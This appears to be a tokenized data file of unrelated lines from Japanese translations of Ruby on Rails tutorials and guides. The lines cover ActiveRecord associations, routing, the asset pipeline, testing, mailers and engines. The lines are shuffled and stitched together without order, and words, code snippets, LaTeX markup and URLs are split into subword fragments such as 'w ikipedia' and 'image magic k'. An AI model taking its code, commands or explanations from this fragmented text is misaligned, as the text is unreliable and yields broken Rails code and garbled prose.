▁たとえば 、\ k ode { 引数 } を 1 つ 取り 、 引数 が 空 かどうか に 基 づ いた メッセージ を返す \ emph { string _ message } という 関数 を定義し てみましょう 。
▁self を省略した 結果を リスト \ ref { code : first _ migration } に示します 。
▁{0} 図 3▖1 1 ▁{/0}{1} 隠 れ ている \ k ode { ▖ gitignore } ファイル を表示する {/1}
▁` yield ` を呼び出す 代わりに 、 パーシャル レイアウト 内にある コードの ブロック を出力する こともできます 。
▁\ text tt { GET } ▁ は 、 最も 頻繁に 使用される HTTP 操作 で 、 主 に Web 上の データを \ emph { 読み 取 る } 際に 使われ ます ▟ “ ページ を取得する ” ▁という 意味 のとおり 、 Web ブラウザは google ▖ com や w ikipedia ▖ org のような Web サイト を開く たびに \ text tt { GET } リクエストを送信し ています 。
▁@ url ▁= ▁user _ url (@ user )
▁client ▁= ▁Client ▖ readonly ▖ first
▁ ボタン を サインアップ ページ にリンクする 。
▁* ▁` config ▖ middleware ▖ use ( new _ middleware , ▁ args ) ` ▁- ▁ ミドルウェアスタック の 一番 下 に 新しい ミドルウェア を追加します 。
▁* ▁`: delete ` を指定すると 、 関連付けられたオブジェクト は データベースから 直接 削除 されます ▟ このとき コールバック は 実行 されません 。
▁以下の コマンドで 、 RDoc の 出力 を 手 軽 に 確 認 できます 。
▁ ビルトイン メソッドと 一 貫 させるため 、 相 対 パス 以外 は 利用 できません 。
▁ あるいは ヘッダー を 除 去 することもできます 。
▁ これはリスト \ ref { code : edit _ update _ wrong _ user _ tests } で使用されていました 。
▁( 前述の とおり 、 3 番目の 場合 については 演習 に回します ) 。
▁ 演習 の 解 答 が 少 ない 分 、 本 編 で 解 答 を 示す ようにしています 。
▁# ▁De c la re s ▁an ▁attribute ▁reader ▁back ed ▁by ▁an ▁internally - name d
▁ アセットパイプライン が有効になってい る 場合は 、 これらの アセット ファイルは プ リ プロセス の 対象 となり 、 処理 後 の ファイルが ` public / assets ` ディレクトリ に置かれ て Rails アプリケーション または Web サーバー によって 利用 されます 。
▁# ▁ 追加 の アセットを プリコンパイル する ▁( application ▖ js 、 application ▖ css 、 および すべての
▁最初に 、 特定 記事 の コメント をすべて 表示する 部分を 切り 出 して コメント パーシャル を作成し ましょう 。
▁ 重複 を 取り除く テクニック のひとつ として 、 ビューで 「\ emph { 埋め込み Ruby } 」( Embedded ▁Ruby ) ▁ を使用できます 。
▁ Invoice ▖ find _ in _ batches ▁do ▁| invoices |
▁このコードは リスト \ ref { code : index _ final _ refactoring } で使用されていました ▟ もうひとつ 、
▁なお 、 OS ▁X であれば ▁\ k ode { brew ▁install ▁image magic k } ▁ で インストール できます ▁(\ href { http :// brew ▖ sh /}{ Home brew } が インストール され ていなければ インストール してください ) 。
▁has _ one ▁: account
▁# ▁For ▁API s , ▁you ▁may ▁want ▁to ▁use ▁: null _ session ▁instead ▖
▁ //= ▁require ▁library _ name
▁* ▁` collection ▖ build ( attributes ▁= ▁ { }, ▁ ▖▖▖)
▁` New sController ` によって 生成される ページ では 、 ト ッ プ メニュー を 隠 して 右 メニュー を追加した い とします 。
▁{0} リスト 2▖1 2 {/0} ▁╼╼{1} 1 つの マイクロポスト は 1 人のユーザー に のみ 属 する ▟ {2} {/2} ▁ {3} app / models / micropost ▖ rb {/3} {/1}
▁Date ▖ new (200 0, ▁5 , ▁31)▖ prev _ month ▁# ▁=> ▁Sun , ▁30 ▁Apr ▁2000
▁ この章 には 多くの 話 題 が 盛 り 込 まれ ています が 、 一度 読 んだ だけで 理解 する 必要 は まったく ありません 。
▁d ╼\ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁format _ validation ▁( end )╼╼ ▁\ subsection { 一意性 を検証する } ▁% ▁( fold )╼ ▁\ label { sec : uniqueness _ validation }╼╼
▁### ▁ 平 均
▁Home ページを ルート URL に設定する
▁` foreign _ key ` メソッドは 、 クラス名 から 外部キー カラム名 を 求 め る 時に 使用します 。
▁Active ▁Record の データベース接続 は ` ActiveRecord :: Connection Adapters :: Connection P o ol ` によって 管理 されます ▟ これは 、 接続 数 に 限り のある データベース接続 にアクセス する 際の スレッド 数 と 接続 プール が 同 期 するよう にする ものです 。
▁> > ▁Person ▖ create !
▁` ActiveRecord :: Base ` には 、` lock _ version ` カラム名 を上書き するための ` lock ing _ column ` が 用意されています 。
▁=> ▁#< Word : 0 x 22 d 0 b 20 >
▁ 多 対 多 の リレーションシップ を 宣言 する もう 1 つの 方法は ` has _ many ▁: through ` です 。
▁ これはリスト \ ref { code : signup _ route } で使用されていました 。
▁以下の リスト で それぞれの 役 割 を 説明します 。
▁if ▁options [: us age ]
▁m attr _ accessor ▁: load _ once _ paths
▁ 開発者 であれば 誰 も が 通 る 道 です 。
▁この場合 、 以下のような コード を実行する 必要がある でしょう 。
▁まずは 、 有効なメールアドレス を リスト \ ref { code : email _ format _ valid _ tests } に示します 。
▁app / assets / stylesheets
▁Help ページ や About ページ 、 Contact ページ などの 名前付きルート を定義し たい場合は 、\ k ode { get } ルール を使って 定義 することができます ▁( リスト \ ref { code : contact _ route })▟ たとえば 次のような ルール は 、
▁ 何か 問題が生じ た場合 は 、 以下を実行して
▁これで 、 アプリケーション 自体 を作成するための 下 準備が整いました 。
▁> , ▁▖▖▖ }
▁これ より 、 複数の 静的なページ を 取り 扱 う StaticPages コントローラ を作成します 。
▁\ k ode { destroy } アクション では 、\ k ode { find } メソッドと \ k ode { destroy } メソッドを 1 行 で 書く ために 2 つの メソッドを 連結 ▁( chain ) ▁ し ている点に注目してください 。
▁このメソッド が 受 け 取 れる 引数 は 、 リンク の種類 ▁( `: rs s ` または `: atom ` ) 、 url _ for で 渡される オプション の ハッシュ 、 および タグ の ハッシュ です 。
▁` years _ ago ` メソッドは 、 年 数 を受け取り 、 その 年 数 前の 同じ 日付 を返します 。
▁# ▁Use ▁ sqlite 3 ▁as ▁the ▁database ▁for ▁Active ▁Record
▁fixture ファイル 内で 埋め込み Ruby を使うと 、 多 量 のテスト ユーザー を作成する ことができる
▁上の 実行 結果 では 、 実際の テストは 1 / 10 秒 以下 で 実行されます が 、 テストスイート は 7 秒 以上 か か っています 。
▁# ▁ 部分 的な 変更 を行なう
▁(\ href { http :// en ▖ w ikipedia ▖ org / wiki / E x t re me _ Programming } { エ ク スト リ ーム ・ プログラミング ▁( E x t re me ▁ Programming )} ▁という 開発 手法 では 、 この 模 索 段 階 を \ emph { ス パ イ ク ▁( s p i k e ) ▁ } と 呼んでいます ) 。
▁ テストスイート は 期待どおり パス ▁GR EEN {0}{1}{/1}{1}{2} {/2} {/1}{1}{/1}{/0} ▁ します
▁このメソッド は単なる 目 印 であり 、 メソッドの 本 体 と 戻り値 の 間 には 関連 はありません 。
▁\ k ode { footer } を \ k ode { div } に置き換え ても 動作 は 変わりません 。
▁その 際 、 CDN の " origin " 設定 を Rails アプリケーションの Web サイト ` example ▖ com ` にする 必要もあります ▟ origin サーバー の設定 方法 の ドキュメント については プロ バ イ ダ ー に お 問い合わせ ください 。
▁ マイグレーション 名 は 自由に 指定 できます が 、 上の ように 末 尾 を \ k ode { to _ users } に しておく ことをお勧めします ▟ こう しておく と 、\ k ode { users } テーブルに カラム を追加する マイグレーション が Rails によって自動的に 作成される からです 。
▁Sessions コントローラの \ k ode { create } アクション ▁( 暫 定 版 )
▁( この 点を 深 く 理解 したい 方 には 、 「\ emph { The ▁Rails ▁4 ▁Way } 」( O b i e ▁F er n and e z 著 ) ▁ がお勧めです ) ▁ 。
▁ 返される オブジェクトは 、 渡された 属性 に基いて インスタンス化され 、 外部キー を 経 由 する リンク が設定され ます ▟ 関連付けられたオブジェクト は 、 値 が返され た時点で はまだ 保存 されて _ いない _ ことにご注意ください 。
▁#### ▁ 複数の 関連付け を結合する
▁これ を解決する のが \ emph { ページネーション ▁( pagination ) ▁ } という もの で 、 この場合は 、 たとえば 1 つの ページに 一度 に 30 人 だけ ユーザー を表示する という ものです 。
▁ 配列 ▁( array ) ▁ は 、 特定の 順序 を持つ 要素 の リスト です 。
▁# ▁ lib / blorgh / engine ▖ rb
▁たとえば 、[ この アカウント 設定 を保存する ] ▁ の ▁cookies ▁( remember ▁me ) ▁ が有効になってい る か 、 その後 も 保 持 されている かどうか のテスト は 含 まれ て いません 。
▁ここで 1 つ 注意が必要です ▟ `: counter _ cache ` オプションは ` belongs _ to ` 宣言 で 指定します が 、 実際に 数を 数 え たい カラム は 、 相手 の モデル ( 関連付けられている モデル ) の方 に追加する 必要があります 。
▁これらの 属性 は 、 データベースの ` articles ` テーブルに 自動的に 追加 され 、` Article ` モデルと 対応 付け られます ▁( 訳 注 : ▁ 実際には 後 述 する マイグレーション を行わ ない と データベース と の 対応 付け は 完了 しません ) 。
▁ ここに は アプリケーション 、 エンジン 、 Rails フレームワーク を含む あらゆる 登録 済み 名前空間 が含まれます 。
▁\ href { http :// localhost :3000/ signup }{/ signup } で表示される 新しい ユーザー登録ページ
▁\ k ode { assert \_ select } には 色 々 な 指定 の 仕 方 があります ▟ その 代 表 例 をいくつか 表 \ ref { table : assert _ select } で 紹介します 。
▁L im it と O f f set
▁ フォーム input の 「 隠 し フィールド 」 を作成します ▟ この 隠 し フィールド は 、 通常 であれば HTTP が ス テ ート レ ス であること によって 失われ る 可能性のある データを 送信 したり 、 ユーザー から 見え ない ように しておきたい データを 送信 するのに 使用されます 。
▁ 削除 された ディレクトリ と ファイルを 無 事 復 旧 d ました 。
▁\ ref { sec : remember _ me } では 、 ブラウザを閉じ ても 保 持 される セッション を追加します 。
▁DELETE ▁ / articles / : id (▖ : format ) ▁articles # destroy
▁* ▁ 関連付けの スコープ 制御
▁# ▁template ▖ rb
▁このメソッドは 、 任意の 数 の アクション 名を 引数に 取ること が でき 、 引数 の 末 尾 項目 で オプション ハッシュ を使用できます 。
▁### ▁Action ▁Mailer の レイアウト
▁\ href { http :// www ▖ railstutorial ▖ org / screencasts }{\ emph { Ruby ▁on ▁Rails チュートリアル } スクリーンキャスト } ▟ 本書 に合わせて 、 完 全 版 の スクリーンキャスト を用意し て あります 。
▁| ` raise _ delivery _ errors ` | メール 配信 に 失敗した場合 に エラーを 発生 する かどうかを指定します 。
▁<%= ▁form _ for ▁@ person , ▁url : ▁ { action : ▁" update "} ▁do ▁| person _ form | ▁%>
▁ 変更 前の 以下のコード は 、 より 明 示 的 でした 。
▁Client ▖ where ( orders _ count : ▁[1, 3 , 5 ])
▁* ▁[ jquery - ujs に関する 外部 記事 の リスト ]( https :// github ▖ com / rails / jquery - ujs / wiki / E x ter n al - articles )
▁ユーザー登録 の場合 、 エラーメッセージ は 特定の Active ▁Record オブジェクト に 関連付け ら れ ていた ので その 手 が 使 え ました ▟ しかし セッション では Active ▁Record の モデル を使用して いない ため 、 その 手 が 通 用 しません 。
▁do _ something _ return ing _ a _ string ( string )
▁\ emph { 追加 情報 } : ▁Rails の表示 では 「 非 \ href { http :// es ▖ w ikipedia ▖ org / wiki / ASCII } { ASCII } 文字 」 も サポート されています ▟ 「 ¡ H ol a , ▁ mundo !」 には ス ペ イン 語 特有の 逆 さ 感 嘆 符 「 ¡ 」 が含まれています 。
▁ メール フォーマット を 正規表現 で 検証 する ▁( ▁\ passing ▁ { 5 }{/ 5 } ▁ { 6 } app / models / user ▖ rb { / 6 })
▁たとえば 、 メールアドレス や パスワード で 、 確 認 フィールド を使用すると します 。
▁scaffold で生成した 実際の コード には {0}{1} リスト 2▖ 8 {/1}{/0} よりも 多くの 改行 が追加され ている ことがあります 。
▁{0} 図 2 ▖7{/0}{1} ユーザー 編集 用の ページ ▁(\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit })▟ \ href { http :// railstutorial ▖ org / images / figures / demo _ edit _ user _ rails _ 3- full ▖ png }{( 拡大 ) }{/1}
▁Client ▖ where ( locked : ▁true )
▁" digest ":" 12 b 3 c 7 d d 7 4 d 2 e 9 d f 37 e 7 c b b 1 e fa 76 a 6 d " }, " application - 1 c 57 5278 9 5 88 ac 18 d 7 e 1 a 50 b 1 f 0 fd 4 c 2▖ css ":{" logical _ path ":" application ▖ css "," m time " : "2013-0 7-2 6 T 22 : 5 6 : 17 - 07 :00 "," size " : 1 59 1,
▁* ▁ 名前空間化され た ` Application Controller ` ス タブ
▁Active ▁Record の オブジェクト には 2 種類 あります ▟ オブジェクトが データベースの 行 ( row ) に 対応 している もの と 、 そうでない ものです 。
▁$ ▁bundle ▁exec ▁rake ▁test ╼ 3 ▁tests , ▁3 ▁assertions , ▁0 ▁failure s , ▁0 ▁errors , ▁0 ▁skip s
▁ 同様に 、` c attr _ * ` に ブロック を渡して 属性 に デフォルト値 を設定する こともできます 。
▁ここで 、 URL が \ href { http ://0▖0▖0▖0:3000/ users /1}{/ users /1 } と 表示され ていることに注目してください ▟ ご想像 のとおり 、 この 数字 \ k ode {1} は {2} {3} 図 2▖2 {/3} {/2} の \ k ode { id } 属性 その ものです 。
▁ 社 会 の 智慧 と 建 設 的な 姿勢 のおかげで 、 今 では ` for t y _ two ` も使用できます ▁( 訳 注 : ▁[ Rails ▁ 2▖2 ▁ 以降 ]( https :// github ▖ com / rails / rails / commit / 9 d 8 cc 60 ec 38 45 fa 3 e 6 f 92 92 a 6 5 b 1 19 fe 4 f 6 19 f 7 e ) で 使 えます ▟ 「 4 2 」 については 、 W ikipedia の [ 生 命 、 宇宙 、 そして 万 物 について の 究 極 の 疑 問 の 答 え ]( http :// ja ▖ w ikipedia ▖ org / wiki / % E 7 % 9 4 % 9 F % E 5 % 9 1 % B D % E 3 % 80 % 8 1 % E 5 % A E % 87 % E 5 % A E % 99 % E 3 % 80 % 8 1 % E 3%81% 9 D % E 3%81% 9 7 % E 3%81% A 6 % E 4 % B 8 % 87 % E 7 % 89 % A 9 % E 3%81% A B % E 3%81% A 4 % E 3%81% 8 4 % E 3%81% A 6 % E 3%81% A E % E 7 % A 9 % B 6 % E 6 % A 5 % B 5 % E 3%81% A E % E 7 % 9 6 % 9 1 % E 5 % 9 5 % 8 F % E 3%81% A E % E 7 % A D % 9 4 % E 3%81% 88 ) を参照してください ) 。
▁( この ア ド オン を使用する には Heroku アカウント に ク レ ジ ッ ト カ ー ド を設定する 必要があります が 、 アカウント 検証 では 料 金 は 発生 しません ) 。
▁\ k ode { Word } クラスは \ k ode { String } クラス を継承し ているので 、 コンソール を使用して クラス 階層 を明示的に 確 認 できます 。
▁self を省略した 結果を リスト \ ref { code : account _ activation _ preview } に示します 。
▁このコードは リスト \ ref { code : new _ user _ with _ partial } で使用されていました ▟ もうひとつ 、
▁上のコードでは 、` _ product ` パーシャル と ` _ product ` パーシャル の 合 間 に ` _ product _ ru ler ` パーシャル ▁( 引数 な し ) ▁ を レンダリング します 。
▁` app / assets / images ` に置かれている 画像 アセット へのパス を算出 します 。
▁ これはリスト \ ref { code : development _ email _ settings } で使用されていました 。
▁R JS ▁ の設定 ` config ▖ action _ view ▖ debug _ r js ▁= ▁true ` を削除し てください 。
▁\ emph { 応用 問題 } : ▁ / users と / users / : id 両方 の 統合テスト を作成してください 。
▁ 実際には この ガイド では ` - - mountable ` オプション を使用します ▟ これは ` - - full ` の オプション 以外に も いくつかの 機能を 追加 してくれます 。
▁ もう少し 何 と か してみましょう 。
▁ Show ▁action ▁for ▁articles ]( images / getting _ started / show _ action _ for _ articles ▖ png )
▁ ブラウザ と の やりとり を 増 や さ ない ように 工 夫 した 例 を以下に示します 。
▁self を省略した 結果を リスト \ ref { code : micropost _ accessible _ attribute } に示します 。
▁ ユーザーが 画像 を 置 け ない
▁Article ▖ recent ▖ many ?
▁もちろん 、 テスティング の フレームワーク が 純 粋 な Ruby でない という 点 は 残 念 でも あり 、 著者 にとって は テキスト ベースの ストーリー は い さ さ か 冗 長 な 面 も ある と 思 われます 。
▁{0} 図 7 ▖ 1 {/0} ▁{1} この節 で 作成する ユーザープロファイル のモックアップ {/1}
▁@ product ▁= ▁ Product ▖ find ( params [: id ])
▁たとえば 、 フィーチャー ファイル にある 以下のコード は 、
▁ セキュア な パスワード の実装 は 、\ k ode { has _ secure _ password } という Rails の メソッドを呼び出す だけで ほとんど 終 わ ってしまいます ▁( このメソッドは Rails ▁3▖1 から 導 入 されました ) 。
▁ 著 作 権 と ラ イ セ ン ス
▁今度は CDN の コピー です 。
▁この 機能を サンプルアプリケーション に 実装 してみましょう 。
▁* ▁Rails ▁4▖0 では ` link _ to ` ヘルパー での `: con fi rm ` オプション が 非推奨 になりました 。
▁ delegate ▁: logger , ▁to : ▁: Rails
▁リスト \ ref { code : microposts _ home _ page } の コードを 動 か す ためには 、 いくつかの Partial を 作る 必要があります 。
▁create ▁app / views / users
▁図 \ ref { fig : page _ flow _ home _ page _ feed _ mockup } で お 見 せ した ステータスフィード の 最 終 形 を 図 \ ref { fig : home _ page _ feed _ mockup } に 再度 掲 載 します 。
▁# ▁< id > 44 04 </ id >
▁# ▁# {@ comment ▖ text }
▁# ▁=> ▁[" David ", ▁" Jeremy ", ▁" J o se "]
▁> > ▁1▖ kilobyte ╼ ▁=> ▁10 2 4 ╼ ▁> > ▁5 ▖ me g abytes ╼ ▁=> ▁5 242 88 0
▁ ハッシュの 生成 法 については 、 本ガイド の [ production 環境 の場合 ](# production 環境 の場合 ) で 後 述 します 。
▁person ▖ errors ▖ full _ messages
▁# ▁=> ▁ { nil => nil , ▁1 =>1 , ▁nested : { a : 3 , ▁5 => 5}}
▁この アイディア に従って リスト \ ref { code : login _ create _ user _ instance } と リスト \ ref { code : i mprov ed _ remember _ me _ test } の 不 足 分 を 埋 め ▁( ヒント として \ k ode { ● } や \ k ode { FILL _ IN } を 目 印 に置い て あります ) 、[ remember ▁me ] ▁ チェックボックス のテスト を 改良 してください 。
▁# ▁R F C による と キャッシュ は 最 長 1 年 まで
▁``` y a m l
▁example ▖ com への サインアップ が 成功 しました 。
▁ ユーザー登録フォーム を完成させ るために 、 リスト \ ref { code : create _ action _ strong _ parameters } の コメントアウト された 部分 に コードを 書き 、 適切に 動作する ようにしましょう 。
▁このコードは 、 { p 0} や \ ref { sec : mvc _ in _ action } でも 説明したように 、 {3} @ name {/3} および {3} @ email {/3} { 4 } インスタンス変数 {/4} について 、 取り出し ( get ) ▁ と 割り当て ( set ) ▁ を行う ▁" ゲ ッ ター " ▁ と ▁" セッター " ▁という メソッドを それぞれ 作成します 。
▁### ▁`: message `
▁$ ▁ l s ▁- l
▁この ヘッダー は 、 サーバー と クライアント ブラウザの 間 にある すべての キャッシュ ▁( プロキシ など ) ▁ に対して 、 サーバー が提供する この コンテンツ は 1 年 間 キャッシュ して よい と 通知 します 。
▁ エンジン で使用する クラス で 必 須 となる メソッドは ` find _ or _ create _ by ` のみ です ▟ このメソッドは その クラスの オブジェクトを 1 つ 返します 。
▁これで 、 削除 に関する コード に対して 、 よく テスト でき ている 状態 になりました ▟ テストスイート を 走 ら せる と {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するはずです 。
▁@ @ field _ error _ proc ▁= ▁ Proc ▖ new { ▁▖▖▖ ▁ }
▁ 時間 のある ときに この ルート マッピング を 読んで み る ことをお勧めします ▟ また 、 より 詳細な ルーティング の 扱 い については Rails ▁Guides の 「\ href { http :// guides ▖ rubyonrails ▖ org / routing ▖ html } { Rails における 外部 から 内部 への ルーティング } ▁( 英語 )」 を参照 する ことをお勧めします 。
▁User ▖ active
▁` size ` メソッドは 、 そのオブジェクト の エラーメッセージ の 総 数 を返します 。
▁ V ia : ▁1▖ 1 ▁var n is h
▁* ▁ データベースの マイグレーション 、 検証 ( validation ) 、 コールバック
▁最後に 、 第 \ ref { cha : account _ activation _ and _ password _ reset } 章で メールアドレス を使って アカウントを有効化する 方法 と 、 パスワードを リ セット する方法 について 学びます 。
▁### ▁ 関連付けの 一括読み込み で 条件 を指定する
▁<%= ▁stylesheet _ link _ tag ▁" main _ print ", ▁ media : ▁" print " ▁%>
▁以下は テーブル を作成する マイグレーション です 。
▁ これを行なうには 、 最初に 以下のコマンドを実行し て マイグレーション を エンジン から コピー する必要があります 。
▁has _ many ▁: section s
▁` has _ many ▁: through ` 関連付け は 、 他 方のモデル と 「 多 対 多 」 の つながり を設定する 場合に よく使われます 。
▁if ▁@ order ▖ customer ▖ nil ?
▁この節では 、 リスト \ ref { code : password _ reset _ update _ action } の 2 つ ▁( または 3 つ ) ▁ の 分 岐 、 つまり 送信 に成功した場合 と 失敗した場合 の 統合テスト を作成します
▁ ネスティング レベル には 制限 がない 点にご注目ください 。
▁# ▁< author > J o sh u a ▁P e e k </ author >
▁class ▁Create A p point ment s ▁< ▁ActiveRecord :: Migration
▁ 今回の 実装 は 、 リスト \ ref { code : login _ form } の ログインフォーム に チェックボックス を追加する ところから始め ます 。
▁ 処理 前の ソース は ` data ` に 保存されます 。
▁* ▁` collection ▖ find (▖▖▖)
▁=> ▁" 2 ▁ w o m en "
▁ エンジン は ホスト アプリケーション と 混 じ らない よう 分 離 しておく こともできます 。
▁def ▁self ▖ # { method _ id } (* args )
▁* ▁ アセットパイプライン の概要 と 機能
▁t ▖ advance ( seconds : ▁1)
▁( これらの アクションは \ ref { sec : a _ working _ follow _ button _ the _ standard _ way } で 実装します ) 。
▁Date ▖ new (201 0, ▁5 , ▁24 )▖ weeks _ ago (1) ▁# ▁=> ▁Mon , ▁17 ▁May ▁2010
▁ここでは 、 ” サインイン ” ▁ の 共通 パターン を実装する ために セッション を使用します ▟ ここで 、 Web の 世界 には セッション の 振る舞い を表現する ための いくつかの 異 な った モデル があります ▟ ブラウザを閉じ ると セッションを 終 了 する 「 忘 却 モデル 」 、[ パスワード を保存する ] ▁ チェックボックス を使用して セッションを 継 続 する 「 継 続 モデル 」 、 ユーザーが 明示的に サインアウト する まで セッションを 継 続 する 「 永 続 モデル 」 など です
▁ テーブル に含まれる フィールド の 最 小 値 を得る には 、 その テーブル を持つ クラス に対して ` minimum ` メソッド を呼び出します 。
▁<% ▁ benchmark ▁" Proc ess ▁data ▁files " ▁do ▁%>
▁\ ref { sec : signup _ error _ messages } では 、 エラーメッセージ の表示 に エラーメッセージ 用 パーシャル ▁( 部分 テンプレート ) ▁ を使用しました が 、 その エラーメッセージ は Active ▁Record によって自動的に 表示され ていた ことを思い出しましょう 。
▁この節で 作成する プロファイル は 、 この アプリケーション における 初めて の 真 に 動的な ページ になります 。
▁ システム を 特定の バージョン に 固定 しておけば 、 今後 RubyGems が変更され たとき の コンフリクト を 防止 できます 。
▁( 複 数 行 の
▁しかし 、 通常の ページ 読み込み プロセス は Turbolinks によって 上書き されてしまう ため 、 ページ 読み込み に依存する イベント は トリガ されません 。
▁validates ▁: term s _ of _ service , ▁ acceptance : ▁true
▁S ublime ▁Text の中から テストが 実行 できる ことは もちろん 便利です が 、 場合によっては Guard の方が 便利な ことも ある と思います ▟ 上の 手順 は 、 著者 が 個 人 的に 常 用 している テスト駆動開発 の テクニック として ご 紹 介 しました 。
▁class ▁Application Controller ▁< ▁ ActionController :: Base
▁ 注 釈 付き の \ k ode { title \_ helper } ▖
▁create ▁test / mailers / user _ mailer _ test ▖ rb
▁リスト \ ref { code : users _ fixtures _ extra _ users } の fixture ファイルが できたので 、 index ページ に対するテスト を書いて みます 。
▁adapter : ▁ j db c sqlite 3
▁$ ▁ kill ▁- 15 ▁1 22 4 1
▁| ▁PATCH / PUT ▁| ▁ / comments / : id (▖ : format ) ▁| ▁comments # update ▁| ▁ sekret _ comment _ path ▁|
▁< script ▁src ="/ assets / application ▖ js "></ script >
▁$ (" a [ data - background - color ] ")▖ click ▁( e ) ▁->
▁#< Client ▁id : ▁ 22 0, ▁first _ name : ▁" S ar a "> ,
▁@ customer ▁= ▁@ order ▖ create _ customer ( customer _ number : ▁ 123 ,
▁以下の ルーティング を例にとって みましょう 。
▁number _ to _ currency ( 1234567890▖50 ) ▁# ▁=> ▁$ 1, 2 34 , 5 67 , 89 0▖5 0
▁< option ▁value =" 12 "> In d ia </ option >
▁上のコード を もっと 短 く する のであれば 、 属性 名 と 、 設定 したい 値を マッピング する ハッシュ を使用して 次のように 書き ます 。
▁#### ▁` first `
▁Capybara の 文法 は以下のような感じ です 。
▁\ emph { Ruby ▁on ▁Rails ▁ チュートリアル } 内の 全て の ソースコード は 、\ href { http :// open source ▖ org / license s / MIT } { MIT ▁ ラ イ セ ン ス } および ▁\ href { http :// people ▖ free b s d ▖ org / ~ ph k /}{ B e er w a re ▁ ラ イ セ ン ス } の 元 で 提供され ています 。
▁ アクセス可能 な 属性
▁foreign _ key ▁= ▁options [: foreign _ key ] ▁|| ▁ reflection ▖ active _ record ▖ name ▖ foreign _ key
▁Windows ユーザー や M ac ▁OS ▁X ユーザーの 多く は コマンドライン という もの に 馴染 み がない ことでしょう ▁( M ac ▁OS ▁X ユーザーの 方が ほんの わずか コマンドライン を 知 っている 人 は 多 い かもしれませんが ) 。
▁ Contribut or ▖ limit (2) ▖ order (: rank )▖ to _ xml
▁ 残念ながら ヘルパーメソッド は テスト から 呼 び 出 せ ないので 、 リスト { p 0} のように {2} current _ user {/2} を 呼 び 出 せ ません ▟ {2} session {/2} メソッドは テスト でも 利用できる ので 、 これを 代わりに 使用します 。
▁ Updating ▁ 34 f 06 b 7 ▖ ▖ 2 c 92 be f
▁* ▁`: even ` ▁- ▁true に設定され ている 場合は 、 偶 数 で なければなりません 。
▁そこで 、 まずは ユーザー 用 fixture ファイルを 修正 し 、 今 い る サンプルユーザー の 一 人 を 管理者 に してみます ▁( リスト \ ref { code : fixture _ user _ admin }) 。
▁上の コードを書く 際に 、 SQL が \ k ode { IN } という キーワード をサポートしてい ること を 前 提 に しています ▁( 大丈夫 、 実際に サポート されています )▟ この キーワード を使用することで 、 id の 集合 の 内 包 ▁( set ▁inclusion ) ▁ に対して テストを 行えます 。
▁ 引数 の 数 に応じて ▁( ar ity メソッドで 確 認 ) 、 呼び出し 可能 オブジェクト を呼び出します ▟ 第 1 引数に は `: root ` に キーを 指定した もの 、 第 2 引数に は キーを 単数形 化 した もの が使用されます 。
▁ 例として 、 ブラックリスト に記載されている すべての ユーザーを ` Blacklist Controller ` に ルーティング したい とします 。
▁te }╼╼ ▁% ▁subsection ▁a _ controller _ class ▁( end )╼╼ ╼ ▁\ subsection { ユーザー クラス } ▁% ▁( fold )╼ ▁\ label { sec : a _ user _ class }╼╼
▁つまり 、 以下 を使用する 機能 テスト と 結合テスト は
▁この テスト の目的は 、 ユーザー登録 ボタン を 押 したときに 期待どおり に 動作 すること 、 ユーザー情報 が 有効な 場合には ユーザーが 新規 作成 され 、 無効な 場合には ユーザー が作成され ない ことを確認する ことです 。
▁{0} 図 12 ▖ 10 {/0} ▁{1} 統 計 情報 パーシャル のモックアップ {/1}
▁< strong > T ext : </ strong >
▁この 結果は Home ページの フィード として 表示されます ▁( 図 \ ref { fig : home _ with _ proto _ feed }) 。
▁config ▖ log _ level ▁= ▁: info
▁` classify ` メソッドは 、` tableize ` と 逆 の動作 です 。
▁ ビューの パス
▁ マイクロポスト リソース のルーティング
▁もし \ ref { sec : image _ upload _ in _ production } を スキップ して い たら 、 ここで 今 まで の 変更 の コミット と merge を 済 ま せ てください 。
▁ 本ガイド で 説明 のために 作成する エンジン に ▁" blorgh " ▁( blog の も じ り ) ▁という 名前 を付け ます 。
▁たとえば 、 写 真 ( picture ) モデル があり 、 この モデルを 従 業 員 ( employee ) モデルと 製 品 ( product ) モデル の両方 に 従 属 させた い とします 。
▁header パーシャル に リンク を追加する
▁* ▁SQLite 3 : ▁[ EXPLAIN ▁ Q U E RY ▁P LA N ]( http :// www ▖ sqlite ▖ org / eq p ▖ html )
▁しかし 、 上の 記 法 は Rails 流 ではありません 。
▁` value ` が ` nil ` の場合 、 " nil " 属性 が " true " に設定され た もの が追加され ます 。
▁\ k ode { edit } アクションと \ k ode { update } アクション の セキュリティ 制限 は まったく 同じ なので 、 これら を 共通の RSpec ▁\ k ode { desc ri be } ブロック で 扱 う ことにします 。
▁まずは 、 いつものように 統合テスト を生成します 。
▁たとえば 、\ href { http ://0▖0▖0▖0:3000/ users }{/ users } を 表示 すれば すべての ユーザーの 一覧 が表示されます し 、\ href { http ://0▖0▖0▖0:3000/ users / new }{/ users / new } を 表示 すれば 新規ユーザー 作成 ページ が表示されます 。
▁以上で 、 コントローラと アクションと ビュー の作成 方法を 説明 いた しました ▟ ここ から は もう少し ブログ ら しい 体 裁 を 整 え ていきましょう 。
▁now ▖ change ( hour : ▁0 )
▁Client ▖ a verage (" orders _ count ")
▁Ruby には 、2 つの ハッシュ を マージ する ビルトイン の ` Hash # merge ` メソッド があります 。
▁ al id ▁email ▁address , ▁like ▁` `@ example ▖ com '' ? ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 6 ac cd 1 ' ></ span >╼╼ ▁\ item ▁ Destroy ▁each ▁of ▁the ▁users ▁created ▁in ▁the ▁previous ▁ exercises ▖ ▁Doe s ▁Rails ▁display ▁a ▁message ▁by ▁default ▁when ▁a ▁user ▁is ▁destroyed ? ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - a b c 7 b d ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁a _ user _ tour ▁( end )╼╼ ▁\ subsection { MVC の 挙 動 } ▁% ▁( fold )╼ ▁\ label { sec : mvc _ in _ action }╼╼
▁ ここ に記述 されている のは ナ マ の SQL なので 、\ k ode { followed _ user _ id s } は エスケープ ではなく \ emph { 内 挿 ▁( interpolate ) ▁ } される ことに注意してください
▁ アプリケーションの ` app / views ` ディレクトリ には 、1 つの コントローラ ごとに 1 つの ディレクトリ が作成され 、 そこに ビューテンプレート ファイル が置かれます ▟ この ビューテンプレート はその コントローラと 関連付け ら れ ています 。
